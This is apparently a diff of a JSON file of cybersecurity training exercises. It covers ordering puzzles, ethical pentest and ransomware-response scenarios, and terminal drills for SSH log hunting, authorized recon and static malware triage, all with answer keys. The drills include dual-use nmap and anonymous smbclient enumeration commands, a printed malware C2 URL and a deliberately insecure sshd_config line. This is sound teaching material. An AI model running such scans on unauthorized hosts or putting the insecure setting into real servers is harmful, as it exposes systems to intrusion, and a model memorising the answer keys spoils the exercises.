+  "level": 13,
+  "brief": "A Linux server (SRV-APP01) appears to have suffered an SSH brute-force attack. Investigate read-only in the logs: how many attempts, from which IP, and did the attack succeed?",
+  "shell": "analyst@soc:~$",
+  "steps": [
+   {
+    "instruction": "Filter the SSH authentication failures: display the \"Failed password\" lines from /var/log/auth.log.",
+    "expect": "^grep\\b.*[Ff]ailed",
+    "hint": "grep \"Failed password\" /var/log/auth.log",
+    "output": "Jul 20 08:16:03 srv-app01 sshd[20455]: Failed password for invalid user admin from 203.0.113.66 port 51022 ssh2\nJul 20 08:16:07 srv-app01 sshd[20457]: Failed password for root from 203.0.113.66 port 51044 ssh2\nJul 20 08:16:11 srv-app01 sshd[20461]: Failed password for backup from 203.0.113.66 port 51070 ssh2\n... (312 matching lines)",
+    "tokens": [
+     "grep",
+     "\"Failed password\"",
+     "/var/log/auth.log"
     ],
-    "success": "Nicely done. You confirmed two key protections: HSTS (a long max-age plus includeSubDomains and preload) forces the browser to use HTTPS only, and the CSP `default-src 'self'; script-src 'self'` restricts scripts to the site's own domain, one more barrier against XSS. curl -I only read the headers: no data was modified.",
-    "tags": [
-      "practice-v1"
+    "distractors": [
+     "awk",
+     "-v",
+     "cat",
+     "\"Accepted\""
     ]
-  },
-  {
-    "id": "crypto-order",
-    "kind": "order",
-    "title": "The TLS handshake in order",
-    "level": 10,
-    "brief": "A client opens an HTTPS connection. Before a single byte of application data is exchanged, TLS (version 1.2 here, with an ECDHE suite) runs its handshake: asymmetric cryptography first, to authenticate and agree on a shared secret, then symmetric cryptography to encrypt fast.",
-    "prompt": "Put the steps of the TLS handshake back into chronological order.",
-    "items": [
-      {
-        "id": "client_key_exchange",
-        "text": "ClientKeyExchange: the client sends its contribution to the key exchange (its ECDHE share)"
-      },
-      {
-        "id": "server_hello",
-        "text": "ServerHello: the server picks the version and the cipher suite, and sends its server random"
-      },
-      {
-        "id": "finished_symmetric",
-        "text": "ChangeCipherSpec + Finished: both sides switch to symmetric encryption, then application data flows encrypted"
-      },
-      {
-        "id": "client_hello",
-        "text": "ClientHello: the client offers its TLS versions, its cipher suites and a client random"
-      },
-      {
-        "id": "key_derivation",
-        "text": "Key derivation: both parties compute the same shared secret, and from it the symmetric session keys"
-      },
-      {
-        "id": "certificate",
-        "text": "Certificate: the server sends its X.509 certificate (its public key, vouched for by a certificate authority)"
-      },
-      {
-        "id": "server_key_exchange",
-        "text": "ServerKeyExchange + ServerHelloDone: the server sends its ECDHE parameters signed with its private key"
-      }
+   },
+   {
+    "instruction": "Count the attempts per source IP to pinpoint the attacker: extract the IP address with awk, then aggregate.",
+    "expect": "awk\\b.*(uniq|sort)",
+    "hint": "grep \"Failed password\" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn",
+    "output": "    312 203.0.113.66\n      4 198.51.100.23\n      2 192.0.2.7",
+    "tokens": [
+     "grep",
+     "\"Failed password\"",
+     "/var/log/auth.log",
+     "|",
+     "awk",
+     "'{print $(NF-3)}'",
+     "|",
+     "sort",
+     "|",
+     "uniq",
+     "-c",
+     "|",
+     "sort",
+     "-rn"
     ],
-    "correctOrder": [
-      "client_hello",
-      "server_hello",
-      "certificate",
-      "server_key_exchange",
-      "client_key_exchange",
-      "key_derivation",
-      "finished_symmetric"
-    ],
-    "explanation": "TLS begins with the hello messages (negotiating the parameters and the randoms), then the server authenticates itself with its X.509 certificate and signs its key exchange parameters (asymmetric). The client replies with its own share, and both sides then derive the same shared secret without ever having transmitted it in the clear. That secret is used to build the symmetric session keys: from Finished onwards, all traffic is encrypted symmetrically (far faster). Asymmetric cryptography served only to authenticate and to agree on the key.",
-    "tags": [
-      "practice-v1"
+    "distractors": [
+     "cut",
+     "wc",
+     "-l",
+     "head"
     ]
-  },
-  {
-    "id": "defense-order",
-    "kind": "order",
-    "title": "The incident response cycle (SANS)",
-    "level": 10,
-    "brief": "A major incident has just been declared. Put the six incident response phases back in chronological order (SANS model).",
-    "prompt": "Tap the phases in the right order, from first to last.",
-    "items": [
-      {
-        "id": "erad",
-        "text": "Eradication — remove the root cause: malware, compromised accounts, attacker access"
-      },
-      {
-        "id": "prep",
-        "text": "Preparation — team, tools, playbooks and backups ready before any incident"
-      },
-      {
-        "id": "lecons",
-        "text": "Lessons learned — post-mortem, updating procedures and defenses"
-      },
-      {
-        "id": "confine",
-        "text": "Containment — isolate to stop the spread (segmentation, network cut-off)"
-      },
-      {
-        "id": "ident",
-        "text": "Identification — detect, qualify and delimit the perimeter of the incident"
-      },
-      {
-        "id": "retab",
-        "text": "Recovery — restore, bring back into production and monitor the return to normal"
-      }
+   },
+   {
+    "instruction": "Query the systemd journal for the SSH service to see what happened after the burst of failures.",
+    "expect": "journalctl\\b.*-u\\s+ssh",
+    "hint": "journalctl -u ssh --since \"08:00\"",
+    "output": "Jul 20 08:16:03 srv-app01 sshd[20455]: Failed password for invalid user admin from 203.0.113.66 port 51022 ssh2\nJul 20 08:19:48 srv-app01 sshd[20790]: Accepted password for backup from 203.0.113.66 port 51890 ssh2\nJul 20 08:19:48 srv-app01 sshd[20790]: pam_unix(sshd:session): session opened for user backup by (uid=0)",
+    "tokens": [
+     "journalctl",
+     "-u",
+     "ssh",
+     "--since",
+     "\"08:00\""
     ],
-    "correctOrder": [
-      "prep",
-      "ident",
-      "confine",
-      "erad",
-      "retab",
-      "lecons"
-    ],
-    "explanation": "SANS cycle: Preparation → Identification → Containment → Eradication → Recovery → Lessons learned. You contain BEFORE eradicating (limit the damage first), you only recover once the cause has been removed, and lessons learned loop back into better preparation.",
-    "tags": [
-      "practice-v1"
+    "distractors": [
+     "-f",
+     "systemctl",
+     "-xe",
+     "--until"
     ]
-  },
-  {
-    "id": "off-order",
-    "kind": "order",
-    "title": "The phases of a penetration test",
-    "level": 10,
-    "brief": "A penetration test follows an ordered methodology, from legal scoping all the way to the report. Put the phases back in the right order.",
-    "prompt": "Tap the phases in their correct chronological order.",
-    "items": [
-      {
-        "id": "exploitation",
-        "text": "Exploitation: gain access by targeting an identified vulnerability"
-      },
-      {
-        "id": "reporting",
-        "text": "Reporting: document the findings, prioritize them, recommend fixes"
-      },
-      {
-        "id": "scoping",
-        "text": "Scoping & authorization: define the scope, sign the rules of engagement"
-      },
-      {
-        "id": "postexploit",
-        "text": "Post-exploitation: privilege escalation, pivoting, impact assessment"
-      },
-      {
-        "id": "recon",
-        "text": "Reconnaissance: information gathering (OSINT, passive then active)"
-      },
-      {
-        "id": "scanning",
-        "text": "Scanning & enumeration: map ports, services and versions"
-      }
+   },
+   {
+    "instruction": "Confirm the attacker's SUCCESSFUL login: isolate the \"Accepted\" lines coming from that IP.",
+    "expect": "grep\\b.*Accepted",
+    "hint": "grep \"Accepted\" /var/log/auth.log | grep 203.0.113.66",
+    "output": "Jul 20 08:19:48 srv-app01 sshd[20790]: Accepted password for backup from 203.0.113.66 port 51890 ssh2",
+    "tokens": [
+     "grep",
+     "\"Accepted\"",
+     "/var/log/auth.log",
+     "|",
+     "grep",
+     "203.0.113.66"
     ],
-    "correctOrder": [
-      "scoping",
-      "recon",
-      "scanning",
-      "exploitation",
-      "postexploit",
-      "reporting"
-    ],
-    "explanation": "Scoping & authorization first (the legal foundation) → Reconnaissance → Scanning & enumeration → Exploitation (targeting a specific vuln) → Post-exploitation (measuring the real impact: privileges, pivoting) → Reporting, which delivers the true value to the client. You don't scan before you have the scope, and you don't wrap up until everything is documented.",
-    "tags": [
-      "practice-v1"
+    "distractors": [
+     "awk",
+     "-v",
+     "\"Failed\"",
+     "uniq"
     ]
-  },
-  {
-    "id": "sys-scen",
-    "kind": "scenario",
-    "title": "Unexpected privileged access on an authorized test",
-    "level": 10,
-    "brief": "During an authorized internal penetration test (written scope, signed rules of engagement), you unexpectedly land a Domain Admin account very early on. Make the right choices.",
-    "start": "n1",
-    "nodes": {
-      "n1": {
-        "text": "You are now Domain Admin on the client's AD. It is a critical finding, but you are meant to stay inside the agreed scope. What do you do first?",
-        "choices": [
-          {
-            "text": "I note the time, capture minimal evidence (`whoami /groups`) and stay inside the agreed scope",
-            "to": "n2"
-          },
-          {
-            "text": "I dump the whole NTDS.dit file and crack every password in the domain",
-            "to": "bad1"
-          },
-          {
-            "text": "I dig through the HR and payroll shares to “illustrate the impact” in the report",
-            "to": "bad2"
-          }
-        ]
-      },
-      "n2": {
-        "text": "Good instinct: minimal evidence, timestamped, no sensitive data touched. This Domain Admin access is a critical finding. What is the most appropriate next step?",
-        "choices": [
-          {
-            "text": "I notify the client point of contact of this critical finding without delay, before going any further",
-            "to": "good1"
-          },
-          {
-            "text": "I create a hidden administrator account to keep access “just in case”",
-            "to": "bad3"
-          },
-          {
-            "text": "I disable the antivirus on the domain controller so I can test more freely",
-            "to": "bad4"
-          }
-        ]
-      },
-      "good1": {
-        "text": "Perfect. You stayed inside the scope, documented things cleanly (targeted evidence, timestamp) and reported the critical finding to the client straight away, as the rules of engagement require. A testing mandate is not a licence to maximize impact: you minimize it and you communicate. That is what ethical pentesting looks like.",
-        "outcome": "good"
-      },
-      "bad1": {
-        "text": "Dumping the entire NTDS.dit database and cracking every hash goes far beyond what is needed to prove impact, and handles real secrets for no reason. A targeted proof of concept is enough; the rest is needless legal and operational risk.",
-        "outcome": "bad"
-      },
-      "bad2": {
-        "text": "Opening the HR/payroll shares exposes real personal data with no necessity. For the report, proof of access (the rights obtained, a high-level listing) is enough: you do not read the sensitive content.",
-        "outcome": "bad"
-      },
-      "bad3": {
-        "text": "Creating a hidden administrator account amounts to planting a backdoor: out of scope, hard to clean up properly, and potentially illegal even on a test. You never degrade the client's security.",
-        "outcome": "bad"
-      },
-      "bad4": {
-        "text": "Disabling the antivirus on a domain controller degrades the security of a production system and steps outside the rules of engagement. A penetration test must never leave the target more vulnerable than it was.",
-        "outcome": "bad"
-      }
-    },
-    "tags": [
-      "practice-v1"
-    ]
-  },
-  {
-    "id": "web-order",
-    "kind": "order",
-    "title": "The OAuth 2.0 flow (Authorization Code)",
-    "level": 10,
-    "brief": "OAuth 2.0 lets an application obtain delegated access without ever seeing the user's password. Put the steps of the Authorization Code flow back in the right order.",
-    "prompt": "Tap the steps in the correct chronological order.",
-    "items": [
-      {
-        "id": "token",
-        "text": "The authorization server returns an access token (and often a refresh token)"
-      },
-      {
-        "id": "redirect",
-        "text": "The client application redirects the user to the authorization server (the /authorize endpoint)"
-      },
-      {
-        "id": "resource",
-        "text": "The application calls the protected API, presenting the access token"
-      },
-      {
-        "id": "login",
-        "text": "The user authenticates with the authorization server and gives their consent"
-      },
-      {
-        "id": "exchange",
-        "text": "The application's back end exchanges that code at the /token endpoint (using its client secret)"
-      },
-      {
-        "id": "code",
-        "text": "The authorization server sends the user back to the application with an authorization code"
-      }
-    ],
-    "correctOrder": [
-      "redirect",
-      "login",
-      "code",
-      "exchange",
-      "token",
-      "resource"
-    ],
-    "explanation": "Authorization Code flow: the application redirects to /authorize, the user signs in and consents, they come back with a single-use authorization code, the back end exchanges that code for a token at /token while proving its identity with the client secret, it receives the access token, and it uses that token to call the API. The exchange happens server-side: neither the token nor the secret ever passes through the browser, which makes this flow safer than the old implicit flow.",
-    "tags": [
-      "practice-v1"
-    ]
-  },
-  {
-    "id": "defense-scen",
-    "kind": "scenario",
-    "title": "Ransomware in progress: incident response decisions",
-    "level": 11,
-    "brief": "08:14. Your EDR reports mass file encryption on a file server, and the alert is spreading to other workstations. A ransomware deployment is under way. Chain the right decisions together.",
-    "start": "n1",
-    "nodes": {
-      "n1": {
-        "text": "The incident is confirmed: workstations are encrypting their files in real time. What is your very first containment action?",
-        "choices": [
-          {
-            "text": "Isolate the affected machines from the network (cut LAN/Wi-Fi) without powering them off",
-            "to": "n2"
-          },
-          {
-            "text": "Cut the power on every affected server to stop the encryption dead",
-            "to": "bad_off"
-          },
-          {
-            "text": "Launch a full antivirus scan across the whole estate and watch how things develop",
-            "to": "bad_wait"
-          }
-        ]
-      },
-      "n2": {
-        "text": "Good call: network isolation stops the spread while preserving the machines. They are still powered on. You want to collect the evidence before cleaning up. In what order?",
-        "choices": [
-          {
-            "text": "Capture volatile memory (RAM) first, then the disk image — order of volatility",
-            "to": "n3"
-          },
-          {
-            "text": "Copy the disk image first, the RAM afterwards",
-            "to": "bad_vol"
-          },
-          {
-            "text": "Reboot the machine to start from a clean state before collecting",
-            "to": "bad_reboot"
-          }
-        ]
-      },
-      "n3": {
-        "text": "Evidence acquired and safely stored. Management, under pressure, asks whether the ransom should be paid to get everything back quickly. Your advice?",
-        "choices": [
-          {
-            "text": "Do not pay: restore from clean offline backups and notify the authorities (ANSSI, and the CNIL if personal data is involved)",
-            "to": "good1"
-          },
-          {
-            "text": "Pay the ransom immediately, it is the fastest route",
-            "to": "bad_pay"
-          }
-        ]
-      },
-      "good1": {
-        "text": "Perfect. You contained before cleaning up, preserved the evidence in the correct order of volatility, refused to fund the attackers and started the restore from clean backups. That is a well-controlled incident response.",
-        "outcome": "good"
-      },
-      "bad_off": {
-        "text": "Abruptly cutting the power stops the encryption but destroys all volatile memory — and the encryption keys sometimes live there — and it can corrupt files that are mid-write. Best practice is to isolate from the network without powering off, so you contain the incident while preserving the evidence.",
-        "outcome": "bad"
-      },
-      "bad_wait": {
-        "text": "Waiting and watching lets the ransomware keep encrypting and spreading laterally. A scan across the whole estate does not contain it: the absolute priority is to isolate the affected machines immediately.",
-        "outcome": "bad"
-      },
-      "bad_vol": {
-        "text": "Wrong order: volatile memory is the most volatile artifact (processes, connections, keys held in memory). You capture it BEFORE the disk. Starting with the disk risks permanently losing evidence that only exists in RAM.",
-        "outcome": "bad"
-      },
-      "bad_reboot": {
-        "text": "A reboot wipes all volatile memory and therefore the most valuable evidence (malicious processes, keys, active connections), and it can re-trigger a persistence mechanism. You collect BEFORE rebooting, never the other way around.",
-        "outcome": "bad"
-      },
-      "bad_pay": {
-        "text": "Paying guarantees neither decryption nor the absence of a leak, funds criminal activity, and marks the organization as a profitable target for future attacks. The authorities advise against it: you restore from clean backups.",
-        "outcome": "bad"
-      }
-    },
-    "tags": [
-      "practice-v1"
-    ]
-  },
-  {
-    "id": "off-term",
-    "kind": "terminal",
-    "title": "Reconnaissance & enumeration of an authorized target",
-    "level": 11,
-    "brief": "Authorized engagement, target in scope. Objective: READ-only reconnaissance and enumeration — map the attack surface without a single intrusive action. Every output is already interpreted for you.",
-    "shell": "pentester@kali:~$",
-    "steps": [
-      {
-        "instruction": "Before any scan, confirm that the target really is within the authorized perimeter by checking the scope file.",
-        "expect": "^cat\\s+scope",
-        "hint": "cat scope.txt",
-        "output": "# Authorized perimeter (Rules of Engagement)\nIN-SCOPE   : 10.10.10.5   (window 09:00 -> 18:00)\nOUT-OF-SCOPE : everything else in the /24\n=> target 10.10.10.5 is authorized: we can proceed."
-      },
-      {
-        "instruction": "Check that host 10.10.10.5 is alive (host discovery), without scanning ports for now.",
-        "expect": "nmap\\s+-sn\\b",
-        "hint": "nmap -sn 10.10.10.5",
-        "output": "Nmap scan report for 10.10.10.5\nHost is up (0.012s latency).\n=> host is up and inside the perimeter: enumeration is possible."
-      },
-      {
-        "instruction": "Enumerate the open ports and identify the exposed service versions.",
-        "expect": "nmap\\b.*-sV",
-        "hint": "nmap -sV -p- 10.10.10.5",
-        "output": "PORT     STATE SERVICE      VERSION\n22/tcp   open  ssh          OpenSSH 7.6p1 Ubuntu\n80/tcp   open  http         Apache httpd 2.4.29\n445/tcp  open  netbios-ssn  Samba smbd 4.7.6\n=> 3 exposed services; versions to check against known security advisories."
-      },
-      {
-        "instruction": "Identify the web service's application stack from its HTTP banner (response headers).",
-        "expect": "curl\\s+-I\\b",
-        "hint": "curl -I http://10.10.10.5",
-        "output": "HTTP/1.1 200 OK\nServer: Apache/2.4.29 (Ubuntu)\nX-Powered-By: PHP/7.2.24\n=> Apache + PHP stack identified from the banner, with no intrusive request."
-      },
-      {
-        "instruction": "Map the exposure of the SMB service by listing the visible shares (enumeration, no access to the data).",
-        "expect": "smbclient\\s+-L\\b",
-        "hint": "smbclient -L //10.10.10.5 -N",
-        "output": "Sharename       Type      Comment\n---------       ----      -------\nprofiles        Disk      (anonymous listing allowed)\nprint$          Disk      Printer Drivers\nIPC$            IPC       IPC Service\n=> one share listable anonymously: exposure to be documented in the report."
-      }
-    ],
-    "success": "Reconnaissance and enumeration complete, without a single intrusive action. You confirmed the perimeter, verified that the target is alive, mapped 3 services (SSH, HTTP, SMB), identified the application stack and spotted an SMB share listable anonymously. Next step in a real engagement: validate any vulnerabilities ONLY within the scope, then record everything in the report.",
-    "tags": [
-      "practice-v1"
-    ]
-  },
-  {
-    "id": "sys-order",
-    "kind": "order",
-    "title": "How a Kerberos authentication unfolds",
-    "level": 11,
-    "brief": "A user signs in to a service in an Active Directory domain: Kerberos comes into play. Put the exchanges back in order — KDC → TGT → TGS → service.",
-    "prompt": "Tap the exchanges in the protocol's chronological order.",
-    "items": [
-      {
-        "id": "tgs-rep",
-        "text": "TGS-REP: the TGS returns a service ticket encrypted with the key of the requested service account."
-      },
-      {
-        "id": "as-req",
-        "text": "AS-REQ: the client asks the KDC's Authentication Service (AS) to authenticate it (pre-authentication: a timestamp encrypted with the key derived from the password)."
-      },
-      {
-        "id": "ap-req",
-        "text": "AP-REQ: the client presents the service ticket to the target application server to open the session."
-      },
-      {
-        "id": "as-rep",
-        "text": "AS-REP: the AS returns a TGT (Ticket Granting Ticket) encrypted with the key of the krbtgt account, plus a session key."
-      },
-      {
-        "id": "ap-rep",
-        "text": "AP-REP: the service returns an authenticator (mutual authentication) and access is granted."
-      },
-      {
-        "id": "tgs-req",
-        "text": "TGS-REQ: the client presents its TGT to the Ticket Granting Service (TGS) and requests a ticket for a specific service (SPN)."
-      }
-    ],
-    "correctOrder": [
-      "as-req",
-      "as-rep",
-      "tgs-req",
-      "tgs-rep",
-      "ap-req",
-      "ap-rep"
-    ],
-    "explanation": "Kerberos runs in three phases through the KDC: (1) authentication with the AS, which issues the TGT (AS-REQ / AS-REP); (2) a request to the TGS for a service ticket, presenting the TGT (TGS-REQ / TGS-REP); (3) presentation of the service ticket to the target server (AP-REQ / AP-REP). The password is never sent over the network, and the TGT is encrypted with the key of the krbtgt account.",
-    "tags": [
-      "practice-v1"
-    ]
-  },
-  {
-    "id": "threats-term",
-    "kind": "terminal",
-    "title": "Static triage of a suspicious sample",
-    "level": 11,
-    "brief": "An `invoice.pdf` file received as an attachment looks fishy. In an isolated lab, run a STATIC, defensive triage: you never execute the sample, you only observe it. Identify what it really is, compute its hash and extract its strings.",
-    "shell": "analyst@lab:~$",
-    "steps": [
-      {
-        "instruction": "Determine the real type of the `invoice.pdf` file (the extension can lie).",
-        "expect": "^file\\s+\\S",
-        "hint": "file invoice.pdf",
-        "output": "invoice.pdf: PE32 executable (GUI) Intel 80386, for MS Windows"
-      },
-      {
-        "instruction": "This is not a PDF but a disguised Windows executable. Compute its SHA-256 hash so you can compare it against a threat intelligence database.",
-        "expect": "^sha256sum\\s+\\S",
-        "hint": "sha256sum invoice.pdf",
-        "output": "7af10b27c7acec0fb254ab1b671fe5ca70e32d79d1719e6482a4efddeb50ffcb  invoice.pdf"
-      },
-      {
-        "instruction": "Extract the readable strings to spot IOCs (URL, C2 domain, messages).",
-        "expect": "^strings\\b",
-        "hint": "strings invoice.pdf",
-        "output": "!This program cannot be run in DOS mode.\nLoadLibraryA\nGetProcAddress\nCryptEncrypt\nhttp://185.220.101.47/gate.php\nYour files have been encrypted\n.locked"
-      }
-    ],
-    "success": "Triage done. `file` unmasked a PE32 executable hiding behind a `.pdf` extension; the SHA-256 lets you query threat intel without sharing the binary; `strings` turned up telling IOCs — a hard-coded C2 URL, the `CryptEncrypt` call and a ransom note with the `.locked` extension: the signature of ransomware. Purely static analysis, in an isolated environment — you never execute the sample.",
-    "tags": [
-      "practice-v1"
-    ]
-  },
-  {
-    "id": "crypto-term",
-    "kind": "terminal",
-    "title": "Inspect a certificate with openssl",
-    "level": 12,
-    "brief": "You are handed a server's TLS certificate (server.crt) and a downloaded ISO image. Use openssl in read-only mode to inspect the certificate, then verify the file's integrity. You change nothing.",
-    "shell": "user@pc:~$",
-    "steps": [
-      {
-        "instruction": "Display the certificate in human-readable form: subject, issuer, validity period and public key.",
-        "expect": "^openssl\\s+x509\\b",
-        "hint": "openssl x509 -in server.crt -noout -text",
-        "output": "Certificate:\n    Data:\n        Version: 3 (0x2)\n        Signature Algorithm: sha256WithRSAEncryption\n        Issuer: C=US, O=Let's Encrypt, CN=R3\n        Validity\n            Not Before: Jun  1 00:00:00 2026 GMT\n            Not After : Aug 30 23:59:59 2026 GMT\n        Subject: CN=pentaguin.app\n        Subject Public Key Info:\n            Public-Key: (2048 bit)\n        X509v3 Subject Alternative Name:\n            DNS:pentaguin.app"
-      },
-      {
-        "instruction": "Compute the SHA-256 fingerprint of the certificate (the one you compare for certificate pinning).",
-        "expect": "^openssl\\s+x509\\b.*fingerprint",
-        "hint": "openssl x509 -in server.crt -noout -fingerprint -sha256",
-        "output": "sha256 Fingerprint=3B:1A:9F:44:0C:E2:77:8A:D1:56:BB:90:12:34:AB:CD:EF:01:23:45:67:89:AB:CD:EF:01:23:45:67:89:AB:CD"
-      },
-      {
-        "instruction": "Verify the integrity of the downloaded ISO by computing its SHA-256 digest, so you can compare it with the published value.",
-        "expect": "^(openssl\\s+dgst\\s+-sha256|sha256sum)\\b",
-        "hint": "openssl dgst -sha256 debian-13.0.0-amd64.iso",
-        "output": "SHA2-256(debian-13.0.0-amd64.iso)= 4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf34"
-      }
-    ],
-    "success": "Nicely done. You read the certificate's chain of trust (issuer, validity, public key), computed its SHA-256 fingerprint (useful for pinning), and verified a file's integrity through its SHA-256 hash. Mind the distinction: a hash proves integrity (the file has not been altered), not authenticity; for authenticity you need a signature (GPG, or a trusted certificate as here).",
-    "tags": [
-      "practice-v1"
-    ]
-  },
-  {
-    "id": "defense-term",
-    "kind": "terminal",
-    "title": "Log analysis: hunting an SSH brute-force",
-    "level": 13,
-    "brief": "A Linux server (SRV-APP01) appears to have suffered an SSH brute-force attack. Investigate READ-only in the logs: how many attempts, from which IP, and did the attack succeed?",
-    "shell": "analyst@soc:~$",
-    "steps": [
-      {
-        "instruction": "Filter the SSH authentication failures: display the \"Failed password\" lines from /var/log/auth.log.",
-        "expect": "^grep\\b.*[Ff]ailed",
-        "hint": "grep \"Failed password\" /var/log/auth.log",
-        "output": "Jul 20 08:16:03 srv-app01 sshd[20455]: Failed password for invalid user admin from 203.0.113.66 port 51022 ssh2\nJul 20 08:16:07 srv-app01 sshd[20457]: Failed password for root from 203.0.113.66 port 51044 ssh2\nJul 20 08:16:11 srv-app01 sshd[20461]: Failed password for backup from 203.0.113.66 port 51070 ssh2\n... (312 matching lines)"
-      },
-      {
-        "instruction": "Count the attempts per source IP to pinpoint the attacker: extract the IP address with awk, then aggregate.",
-        "expect": "awk\\b.*(uniq|sort)",
-        "hint": "grep \"Failed password\" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn",
-        "output": "    312 203.0.113.66\n      4 198.51.100.23\n      2 192.0.2.7"
-      },
-      {
-        "instruction": "Query the systemd journal for the SSH service to see what happened after the burst of failures.",
-        "expect": "journalctl\\b.*-u\\s+ssh",
-        "hint": "journalctl -u ssh --since \"08:00\"",
-        "output": "Jul 20 08:16:03 srv-app01 sshd[20455]: Failed password for invalid user admin from 203.0.113.66 port 51022 ssh2\nJul 20 08:19:48 srv-app01 sshd[20790]: Accepted password for backup from 203.0.113.66 port 51890 ssh2\nJul 20 08:19:48 srv-app01 sshd[20790]: pam_unix(sshd:session): session opened for user backup by (uid=0)"
-      },
-      {
-        "instruction": "Confirm the attacker's SUCCESSFUL login: isolate the \"Accepted\" lines coming from that IP.",
-        "expect": "grep\\b.*Accepted",
-        "hint": "grep \"Accepted\" /var/log/auth.log | grep 203.0.113.66",
-        "output": "Jul 20 08:19:48 srv-app01 sshd[20790]: Accepted password for backup from 203.0.113.66 port 51890 ssh2"
-      }
-    ],
-    "success": "Attack reconstructed: an SSH brute-force from 203.0.113.66 (312 failures) eventually succeeded against the \"backup\" account, whose password was far too weak. Priority actions: block that IP, disable and reset the backup account, then switch SSH to key-based authentication only (PasswordAuthentication no) and deploy fail2ban.",
-    "tags": [
-      "practice-v1"
-    ]
-  },
-  {
-    "id": "off-anal",
-    "kind": "analysis",
-    "title": "The line that makes the server exploitable",
-    "level": 13,
-    "artifactKind": "code",
-    "brief": "An excerpt from the configuration file of an SSH server (sshd_config) found during an authorized audit. A single line introduces a directly exploitable weakness, without even needing valid credentials. Can you spot it?",
-    "lines": [
-      "Port 2222",
-      "PermitRootLogin prohibit-password",
-      "PasswordAuthentication yes",
-      "PermitEmptyPasswords yes",
-      "MaxAuthTries 3",
-      "AllowUsers deploy admin"
-    ],
-    "question": "Which line introduces a directly exploitable configuration (login possible without valid credentials)?",
-    "correctLine": 3,
-    "explanation": "`PermitEmptyPasswords yes` allows a session to be opened on any account whose password is empty: an attacker can authenticate without any secret at all. The other lines are defensible (non-standard port, `prohibit-password` which lets root in by key only and never by password, an allow-list of users, a limit on attempts). The countermeasure: set `PermitEmptyPasswords` back to `no` (the default value) and favor key-based authentication.",
-    "tags": [
-      "practice-v1"
-    ]
-  }
+   }
+  ],
+  "success": "Attack reconstructed: an SSH brute-force from 203.0.113.66 (312 failures) eventually succeeded against the \"backup\" account, whose password was far too weak. Priority actions: block that IP, disable and reset the backup account, then switch SSH to key-based authentication only (PasswordAuthentication no) and deploy fail2ban.",
+  "tags": [
+   "practice-v1"
+  ]
+ },
+ {
+  "id": "off-anal",
+  "kind": "analysis",
+  "title": "The line that makes the server exploitable",
+  "level": 13,
+  "artifactKind": "code",
+  "brief": "During an authorized audit, you retrieve the configuration file of an SSH server (sshd_config). A single line introduces a directly exploitable weakness, without even needing valid credentials. Can you spot it?",
+  "lines": [
+   "Port 2222",
+   "PermitRootLogin prohibit-password",
+   "PasswordAuthentication yes",
+   "PermitEmptyPasswords yes",
+   "MaxAuthTries 3",
+   "AllowUsers deploy admin"
+  ],
+  "question": "Which line introduces a directly exploitable configuration (login possible without valid credentials)?",
+  "correctLine": 3,
+  "explanation": "`PermitEmptyPasswords yes` allows a session to be opened on any account whose password is empty: an attacker can authenticate without any secret at all. The other lines are defensible (non-standard port, `prohibit-password` which lets root in by key only and never by password, an allow-list of users, a limit on attempts). The countermeasure: set `PermitEmptyPasswords` back to `no` (the default value) and favor key-based authentication.",
+  "tags": [
+   "practice-v1"
+  ]
+ }
 ]
